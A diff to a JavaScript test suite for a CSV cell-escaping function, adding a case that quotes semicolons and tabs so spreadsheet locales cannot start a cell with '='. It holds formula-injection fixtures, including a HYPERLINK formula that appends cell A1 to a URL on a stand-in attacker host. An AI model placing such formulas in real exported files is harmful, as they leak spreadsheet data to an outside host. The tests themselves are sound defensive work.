@@ -20,6 +20,14 @@ describe('csv', () => {
       expect(csvCell(value)).toBe(String(value));
     });
 
+    it('quotes a semicolon, so a locale that splits on it cannot start a cell with =', () => {
+      // Vietnamese and German Excel read an unquoted `;` as a column break.
+      expect(csvCell('x;=HYPERLINK("https://evil.test")')).toBe(
+        '"x;=HYPERLINK(""https://evil.test"")"',
+      );
+      expect(csvCell('x\t=1+1')).toBe('"x\t=1+1"');
+    });
+
     it('neutralises the exfiltration payload specifically', () => {
       const attack = '=HYPERLINK("http://evil.test/?"&A1,"Click me")';
       const cell = csvCell(attack);
